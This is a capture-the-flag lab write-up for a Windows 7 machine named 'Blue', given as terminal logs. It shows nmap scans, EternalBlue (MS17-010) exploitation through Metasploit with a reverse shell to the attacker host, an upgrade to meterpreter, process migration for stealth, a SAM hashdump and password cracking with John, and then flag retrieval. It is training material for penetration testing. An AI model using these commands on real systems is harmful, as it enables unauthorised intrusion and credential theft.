
# Blue

└─$ `nmap 10.10.217.255`             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-19 04:57 EST
Nmap scan report for 10.10.217.255
Host is up (0.14s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds

──(kali㉿kali)-[~]
└─$ `nmap 10.10.217.255 -sV -p 445   `     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-19 05:08 EST
Nmap scan report for 10.10.217.255
Host is up (0.15s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds

┌──(kali㉿kali)-[~]
└─$ `nmap 10.10.217.255 --script smb-protocols -p 445`
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-19 05:13 EST
Nmap scan report for 10.10.217.255
Host is up (0.15s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     202
|_    210

Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds

# Now SMBv1 is vulnerable to EternalBlue, confirming if it is in machine

┌──(kali㉿kali)-[~]
└─$ `nmap 10.10.217.255 --script smb-vuln-ms17-010 -p 445`
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-19 05:16 EST
Nmap scan report for 10.10.217.255
Host is up (0.15s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds

─$ `nmap 10.10.217.255 --script vuln`          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-19 07:17 EST
Nmap scan report for 10.10.217.255
Host is up (0.14s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 116.06 seconds


# its vulnerable, checking if shares are accessible without auth
└─$ `nmap 10.10.217.255 -p 445 --script smb-enum-shares  `
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-19 06:21 EST
Nmap scan report for 10.10.217.255
Host is up (0.14s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.217.255\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.217.255\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.217.255\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ

Nmap done: 1 IP address (1 host up) scanned in 118.62 seconds

************************************************************************Exploiting**************************************************

# we dont get much output as we are unauthenticated, trying once from metasploit

msf6 exploit(windows/smb/ms17_010_eternalblue) > `set RHOSTS 192.168.46.132`
RHOSTS => 192.168.46.132
msf6 exploit(windows/smb/ms17_010_eternalblue) > `set payload windows/x64/shell/reverse_tcp`
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > `exploit`

[*] Started reverse TCP handler on 192.168.46.130:4444 
[*] 192.168.46.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.46.132:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.46.132:445    - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.46.132:445 - The target is vulnerable.
[*] 192.168.46.132:445 - Connecting to target for exploitation.
[+] 192.168.46.132:445 - Connection established for exploitation.
[+] 192.168.46.132:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.46.132:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.46.132:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 192.168.46.132:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 192.168.46.132:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 192.168.46.132:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.46.132:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.46.132:445 - Sending all but last fragment of exploit packet
[*] 192.168.46.132:445 - Starting non-paged pool grooming
[+] 192.168.46.132:445 - Sending SMBv2 buffers
[+] 192.168.46.132:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.46.132:445 - Sending final SMBv2 buffers.
[*] 192.168.46.132:445 - Sending last fragment of exploit packet!
[*] 192.168.46.132:445 - Receiving response from exploit packet
[+] 192.168.46.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.46.132:445 - Sending egg to corrupted connection.
[*] 192.168.46.132:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 192.168.46.132
[*] Command shell session 1 opened (192.168.46.130:4444 -> 192.168.46.132:49158) at 2023-12-20 04:19:18 -0500
[+] 192.168.46.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.46.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.46.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>`systeminfo`
systeminfo

Host Name:                 JON-PC
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Jon
Registered Organization:   
Product ID:                00371-177-0000061-85337
Original Install Date:     12/12/2018, 9:13:23 PM
System Boot Time:          12/20/2023, 3:06:21 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~2208 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-06:00) Central Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,610 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,621 MB
Virtual Memory: In Use:    474 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.46.254
                                 IP address(es)
                                 [01]: 192.168.46.132
                                 [02]: fe80::951b:3b8d:fe3a:1cb8

C:\Windows\system32>`whoami`
whoami
nt authority\system

# We have a shell, and we have the highest windows privilege `nt authority\system`

# We can backgroud our current shell usint ctrl+Z and then convert shell to meterpreter session

# Now we need to run a post module, we can run a post module after the exploit here the module will be something like shell
# Converting shell to meterpreter shell (note it would be by default meterpreter session only but since we intentionallty provided payload as set `payload windows/x64/shell/reverse_tcp`) By this we learn `how to convert a shell to meterpreter siossion`

C:\Windows\system32>`^Z`
Background session 2? [y/N]  `y`
msf6 exploit(windows/smb/ms17_010_eternalblue) > `sessions`

Active sessions
===============

  Id  Name  Type               Information                                                                      Connection
  --  ----  ----               -----------                                                                      ----------
  2         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Micros...  192.168.46.130:4444 -> 192.168.46.132:49159 (192.168.46.132)

# we can see the type here is `shell`

msf6 exploit(windows/smb/ms17_010_eternalblue) > `search sshell_to_meterpreter`

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(windows/smb/ms17_010_eternalblue) > `use 0`
msf6 post(multi/manage/shell_to_meterpreter) > `options`

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on

msf6 post(multi/manage/shell_to_meterpreter) > `sessions`

Active sessions
===============

  Id  Name  Type               Information                                                                      Connection
  --  ----  ----               -----------                                                                      ----------
  2         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Micros...  192.168.46.130:4444 -> 192.168.46.132:49159 (192.168.46.132)

msf6 post(multi/manage/shell_to_meterpreter) > `set SESSION 2`
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > `set LPORT 3344`
LPORT => 3344
msf6 post(multi/manage/shell_to_meterpreter) > `set LHOST 192.168.46.130`
msf6 post(multi/manage/shell_to_meterpreter) > `run`

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.46.130:3344 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (200774 bytes) to 192.168.46.132
[*] Meterpreter session 3 opened (192.168.46.130:3344 -> 192.168.46.132:49160) at 2023-12-20 04:55:49 -0500
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > `sessions`

Active sessions
===============

  Id  Name  Type                     Information                                                                      Connection
  --  ----  ----                     -----------                                                                      ----------
  2         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Micros...  192.168.46.130:4444 -> 192.168.46.132:49159 (192.168.46.132)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                     192.168.46.130:3344 -> 192.168.46.132:49160 (192.168.46.132)

# we can see now meterpreter session also, lets connect to it, we can see that we have highest privilege NT Authority

msf6 post(multi/manage/shell_to_meterpreter) > `sessions -i 3`
[*] Starting interaction with 3...

meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM

# Listing all the process running on windows system using command `ps`

meterpreter > `ps`

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 188   1824  cmd.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 216   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 284   276   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 292   432   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 332   276   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 340   284   conhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 344   324   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 372   324   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 432   332   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 440   332   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 448   332   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 540   432   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 604   432   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 684   432   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 696   372   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 756   432   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 780   432   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 956   432   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 992   1380  powershell.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1068  432   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1336  432   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 1692  284   conhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1824  432   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1828  432   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1864  432   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
 1900  432   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1988  432   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM

meterpreter > 

# Migrating to other process, `why do we need to migrate?` - we mighrate to other process so that we run in name of already running process and hide ourselves to have a persistence and we can then stay long on the machine

# So migrating to other process,

meterpreter > `migrate 1692`
[*] Migrating from 992 to 1692...
[*] Migration completed successfully.

# Now since we are having NT Authority we can dump the Hashes using `hashdump` , note that in windows the user hash are stored in `SAM `file in system32/config but this command may only work if we migrate to any oother process of 64 bit

meterpreter > `hashdump`
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > 

# now we need to crack these hash, so first we will save this in a file and then use `hashcat` and `John` , hashcat required more memory but we can use John
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ `echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash.txt`
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ `cat hash.txt    `                                                              
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ `sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)     
1g 0:00:00:00 DONE (2023-12-20 07:04) 1.176g/s 12000Kp/s 12000Kc/s 12000KC/s alqui..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                              
┌──(kali㉿kali)-[~]

# Finally we are able to get password `alqfna22`

*********************************************************************************************************************************

# finding Flags


HINT -`Flag1? This flag can be found at the system root.` 

# This means falg can be in C drive , as windows system root typically  is C://windows/system32 and we get the flag in C directory itself

meterpreter > cd C:\\
meterpreter > dir
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-12 22:13:36 -0500  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 01:08:56 -0400  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-13 23:20:08 -0400  PerfLogs
040555/r-xr-xr-x  4096   dir   2011-04-12 04:28:43 -0400  Program Files
040555/r-xr-xr-x  4096   dir   2009-07-14 00:57:06 -0400  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2009-07-14 01:08:56 -0400  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-12 22:13:22 -0500  Recovery
040777/rwxrwxrwx  4096   dir   2023-12-20 04:31:32 -0500  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-12 22:13:28 -0500  Users
040777/rwxrwxrwx  16384  dir   2018-12-12 22:13:36 -0500  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 15:27:21 -0400  flag1.txt
000000/---------  0      fif   1969-12-31 19:00:00 -0500  hiberfil.sys
000000/---------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}meterpreter > 

flag1 = `access_the_machine`


HINT -`Flag2? This flag can be found at the location where passwords are stored within Windows.`

`Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. `

# This means flag should be in `C:\Windows\System32\Config` where SAM file is there

meterpreter > `cd Windows/System32/Config`
meterpreter > `dir`
Listing: C:\Windows\System32\Config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2018-12-12 18:00:40 -0500  BCD-Template
100666/rw-rw-rw-  25600     fil   2018-12-12 18:00:40 -0500  BCD-Template.LOG
100666/rw-rw-rw-  44040192  fil   2023-12-20 04:42:10 -0500  COMPONENTS
100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  COMPONENTS.LOG
100666/rw-rw-rw-  262144    fil   2023-12-20 04:42:10 -0500  COMPONENTS.LOG1
100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG2
100666/rw-rw-rw-  65536     fil   2023-12-20 04:42:10 -0500  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2023-12-20 04:42:10 -0500  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2009-07-14 01:01:27 -0400  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2023-12-21 00:10:00 -0500  DEFAULT
100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  DEFAULT.LOG
100666/rw-rw-rw-  103424    fil   2023-12-21 00:10:00 -0500  DEFAULT.LOG1
100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG2
040777/rwxrwxrwx  0         dir   2009-07-13 22:34:57 -0400  Journal
040777/rwxrwxrwx  4096      dir   2023-12-20 04:24:17 -0500  RegBack
100666/rw-rw-rw-  262144    fil   2023-12-21 00:10:49 -0500  SAM
100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  SAM.LOG
100666/rw-rw-rw-  21504     fil   2023-12-21 00:10:49 -0500  SAM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SAM.LOG2
100666/rw-rw-rw-  262144    fil   2023-12-21 00:09:55 -0500  SECURITY
100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  SECURITY.LOG
100666/rw-rw-rw-  21504     fil   2023-12-21 00:09:55 -0500  SECURITY.LOG1
100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SECURITY.LOG2
100666/rw-rw-rw-  38273024  fil   2023-12-21 00:13:57 -0500  SOFTWARE
100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  SOFTWARE.LOG
100666/rw-rw-rw-  262144    fil   2023-12-21 00:13:57 -0500  SOFTWARE.LOG1
100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG2
100666/rw-rw-rw-  12320768  fil   2023-12-21 00:31:11 -0500  SYSTEM
100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:06 -0400  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2023-12-21 00:31:11 -0500  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG2
040777/rwxrwxrwx  4096      dir   2018-12-12 18:03:05 -0500  TxR
100666/rw-rw-rw-  34        fil   2019-03-17 15:32:48 -0400  flag2.txt
040777/rwxrwxrwx  4096      dir   2010-11-20 21:41:37 -0500  systemprofile

meterpreter > `cat flag2.txt`
flag{sam_database_elevated_access}meterpreter > 

Flag2 = `sam_database_elevated_access`


HINT - `flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. `

`You'll need to have elevated privileges to access this flag. `

# Ok So now this is something for which we have to see multiple places and do hit and trial as no such hint is given, however we finally find this in Dcouements folder

meterpreter > `cd Users\\`
meterpreter > `dir`
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:56 -0400  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 03:07:31 -0400  Default
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:56 -0400  Default User
040777/rwxrwxrwx  8192  dir   2018-12-12 22:13:45 -0500  Jon
040555/r-xr-xr-x  4096  dir   2011-04-12 04:28:15 -0400  Public
100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini

meterpreter > `cd Jon`
meterpreter > `dir`
Listing: C:\Users\Jon
=====================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  AppData
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  Application Data
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:48 -0500  Contacts
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  Cookies
040555/r-xr-xr-x  0       dir   2018-12-12 22:49:07 -0500  Desktop
040555/r-xr-xr-x  4096    dir   2018-12-12 22:49:20 -0500  Documents
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:48 -0500  Downloads
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:51 -0500  Favorites
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:48 -0500  Links
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  Local Settings
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:48 -0500  Music
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  My Documents
100666/rw-rw-rw-  524288  fil   2019-03-17 16:05:06 -0400  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2018-12-12 22:32:45 -0500  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288  fil   2018-12-12 22:32:45 -0500  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2018-12-12 22:32:45 -0500  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  NetHood
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:48 -0500  Pictures
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  PrintHood
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  Recent
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:48 -0500  Saved Games
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:48 -0500  Searches
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  SendTo
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  Start Menu
040777/rwxrwxrwx  0       dir   2018-12-12 22:13:31 -0500  Templates
040555/r-xr-xr-x  0       dir   2018-12-12 22:13:48 -0500  Videos
100666/rw-rw-rw-  262144  fil   2023-12-20 05:33:55 -0500  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2018-12-12 22:13:31 -0500  ntuser.ini

meterpreter > `cd Documents\\`
meterpreter > `dir`
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Music
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Videos
100666/rw-rw-rw-  402   fil   2018-12-12 22:13:48 -0500  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 15:26:36 -0400  flag3.txt

meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}meterpreter > 

Flag3 - `admin_documents_can_be_valuable`
